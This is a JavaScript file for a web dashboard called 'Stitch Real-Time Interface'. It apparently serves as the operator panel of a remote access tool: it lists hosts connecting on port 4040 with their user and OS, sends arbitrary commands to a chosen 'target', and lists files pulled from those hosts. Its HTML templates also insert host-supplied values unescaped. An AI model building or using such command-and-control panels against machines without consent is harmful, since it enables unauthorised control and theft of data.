// Stitch Real-Time Interface - JavaScript
let socket;
let selectedConnection = null;

// CSRF Token Helper
function getCSRFToken() {
    const metaTag = document.querySelector('meta[name="csrf-token"]');
    return metaTag ? metaTag.getAttribute('content') : '';
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    initializeWebSocket();
    initializeNavigation();
    loadInitialData();
    startAutoRefresh();
});

// WebSocket
function initializeWebSocket() {
    socket = io();
    
    socket.on('connect', () => {
        document.getElementById('serverStatus').classList.add('online');
        document.getElementById('statusText').textContent = 'Connected';
        showToast('Connected to server', 'success');
    });
    
    socket.on('disconnect', () => {
        document.getElementById('serverStatus').classList.remove('online');
        document.getElementById('statusText').textContent = 'Disconnected';
        showToast('Disconnected from server', 'error');
    });
    
    socket.on('debug_log', (log) => {
        appendLog(log);
    });
    
    socket.on('connection_update', (data) => {
        document.getElementById('activeCount').textContent = data.active_connections;
        loadConnections(); // Refresh connections
    });
}

// Navigation
function initializeNavigation() {
    document.querySelectorAll('.nav-link').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            const section = link.getAttribute('data-section');
            showSection(section);
        });
    });
}

function showSection(sectionName) {
    // Update nav links
    document.querySelectorAll('.nav-link').forEach(link => {
        link.classList.remove('active');
        if (link.getAttribute('data-section') === sectionName) {
            link.classList.add('active');
        }
    });
    
    // Update sections
    document.querySelectorAll('.content-section').forEach(section => {
        section.classList.remove('active');
    });
    document.getElementById(`${sectionName}-section`).classList.add('active');
    
    // Load data for section
    if (sectionName === 'connections') {
        loadConnections();
        loadServerStatus();
    } else if (sectionName === 'files') {
        loadFiles();
    } else if (sectionName === 'logs') {
        loadLogs();
    }
}

// Load Data
function loadInitialData() {
    loadConnections();
    loadServerStatus();
}

async function loadServerStatus() {
    try {
        const response = await fetch('/api/server/status');
        const status = await response.json();
        
        document.getElementById('serverListening').textContent = 
            status.listening ? '✅ Listening' : '⚠️ Not Listening';
        document.getElementById('serverPort').textContent = status.port;
        document.getElementById('activeCount').textContent = status.active_connections;
    } catch (error) {
        showToast('Error loading server status', 'error');
    }
}

async function loadConnections() {
    try {
        const response = await fetch('/api/connections');
        const connections = await response.json();
        
        const grid = document.getElementById('connectionsGrid');
        
        if (connections.length === 0) {
            grid.innerHTML = `
                <div class="empty-state">
                    <p>🔍 No connections found</p>
                    <p class="help-text">Connections will appear here when devices connect to port 4040</p>
                </div>
            `;
            return;
        }
        
        grid.innerHTML = connections.map(conn => {
            const isSelected = selectedConnection && selectedConnection.id === conn.id;
            const statusClass = conn.status === 'online' ? 'online' : 'offline';
            const selectedClass = isSelected ? 'selected' : '';
            
            return `
                <div class="connection-card ${statusClass} ${selectedClass}" 
                     onclick="selectConnection('${conn.id}', '${conn.hostname}', '${conn.status}')">
                    <h3>${conn.hostname}</h3>
                    <div class="connection-info">
                        <p><strong>IP:</strong> ${conn.target}</p>
                        <p><strong>User:</strong> ${conn.user}</p>
                        <p><strong>OS:</strong> ${conn.os}</p>
                        <p><strong>Port:</strong> ${conn.port}</p>
                        <p><strong>Status:</strong> ${conn.status.toUpperCase()}</p>
                    </div>
                </div>
            `;
        }).join('');
        
    } catch (error) {
        showToast('Error loading connections', 'error');
    }
}

function selectConnection(id, hostname, status) {
    selectedConnection = { id, hostname, status };
    
    // Update UI
    loadConnections(); // Refresh to show selection
    
    // Update command section
    const infoDiv = document.getElementById('selectedConnectionInfo');
    if (status === 'online') {
        infoDiv.innerHTML = `
            <strong>✅ Selected Connection:</strong> ${hostname} (${id}) - ONLINE<br>
            <em>You can now execute commands on this target</em>
        `;
        infoDiv.style.borderColor = 'var(--success)';
        showToast(`Selected ${hostname}`, 'success');
        showSection('commands');
    } else {
        infoDiv.innerHTML = `
            <strong>⚫ Selected Connection:</strong> ${hostname} (${id}) - OFFLINE<br>
            <em>⚠️ This connection is offline. Commands cannot be executed.</em>
        `;
        infoDiv.style.borderColor = 'var(--warning)';
        showToast(`${hostname} is offline`, 'warning');
    }
}

function showCommands(category) {
    // Update buttons
    document.querySelectorAll('.cat-btn').forEach(btn => {
        btn.classList.remove('active');
    });
    event.target.classList.add('active');
    
    // Update command groups
    document.querySelectorAll('.command-group').forEach(group => {
        group.classList.remove('active');
    });
    document.getElementById(`${category}Commands`).classList.add('active');
}

async function executeCommand(command) {
    const outputElem = document.getElementById('commandOutput');
    
    outputElem.textContent = '⏳ Executing command...\n\n';
    
    try {
        const response = await fetch('/api/execute', {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'X-CSRFToken': getCSRFToken()
            },
            body: JSON.stringify({
                connection_id: selectedConnection ? selectedConnection.id : null,
                command: command
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            outputElem.textContent = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
            outputElem.textContent += `⚡ Command: ${result.command}\n`;
            outputElem.textContent += `🕒 Time: ${new Date(result.timestamp).toLocaleString()}\n`;
            outputElem.textContent += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
            outputElem.textContent += result.output;
            showToast('Command executed', 'success');
        } else {
            outputElem.textContent = `❌ Error: ${result.error}`;
            showToast('Command failed', 'error');
        }
    } catch (error) {
        outputElem.textContent = `❌ Network error: ${error.message}`;
        showToast('Network error', 'error');
    }
}

function executeCommandWithParam(command) {
    const param = prompt(`Enter parameter for ${command}:`);
    if (param) {
        executeCommand(`${command} ${param}`);
    }
}

function executeCustomCommand() {
    const input = document.getElementById('customCommandInput');
    const command = input.value.trim();
    
    if (command) {
        executeCommand(command);
        input.value = '';
    } else {
        showToast('Please enter a command', 'warning');
    }
}

function clearOutput() {
    document.getElementById('commandOutput').textContent = 'Ready to execute commands...';
}

async function loadFiles() {
    try {
        const response = await fetch('/api/files/downloads');
        const files = await response.json();
        
        const grid = document.getElementById('filesGrid');
        
        if (files.length === 0) {
            grid.innerHTML = `
                <div class="empty-state">
                    <p>📁 No files found</p>
                    <p class="help-text">Downloaded files will appear here</p>
                </div>
            `;
            return;
        }
        
        grid.innerHTML = files.map(file => `
            <div class="file-item">
                <div class="file-info">
                    <div class="file-name">📄 ${file.name}</div>
                    <div class="file-details">
                        Size: ${formatBytes(file.size)} | Modified: ${new Date(file.modified).toLocaleString()}
                    </div>
                </div>
                <a href="/api/files/download/${encodeURIComponent(file.path)}" 
                   class="download-btn">Download</a>
            </div>
        `).join('');
        
    } catch (error) {
        showToast('Error loading files', 'error');
    }
}

async function loadLogs() {
    try {
        const response = await fetch('/api/debug/logs?limit=100');
        const logs = await response.json();
        
        const logsDiv = document.getElementById('debugLogs');
        logsDiv.innerHTML = logs.map(log => 
            `<div class="log-entry ${log.level}">[${log.timestamp}] [${log.level}] ${log.message}</div>`
        ).join('');
        
        // Auto-scroll to bottom
        logsDiv.scrollTop = logsDiv.scrollHeight;
        
    } catch (error) {
        showToast('Error loading logs', 'error');
    }
}

function appendLog(log) {
    const logsDiv = document.getElementById('debugLogs');
    const logEntry = document.createElement('div');
    logEntry.className = `log-entry ${log.level}`;
    logEntry.textContent = `[${log.timestamp}] [${log.level}] ${log.message}`;
    logsDiv.appendChild(logEntry);
    
    // Auto-scroll
    logsDiv.scrollTop = logsDiv.scrollHeight;
}

// Auto-refresh
function startAutoRefresh() {
    setInterval(() => {
        const activeSection = document.querySelector('.content-section.active').id;
        
        if (activeSection === 'connections-section') {
            loadConnections();
            loadServerStatus();
        } else if (activeSection === 'logs-section') {
            loadLogs();
        }
    }, 5000); // Refresh every 5 seconds
}

// Toast Notifications
function showToast(message, type = 'info') {
    const container = document.getElementById('toast-container');
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.textContent = message;
    
    container.appendChild(toast);
    
    setTimeout(() => {
        toast.remove();
    }, 3000);
}

// Utilities
function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
}
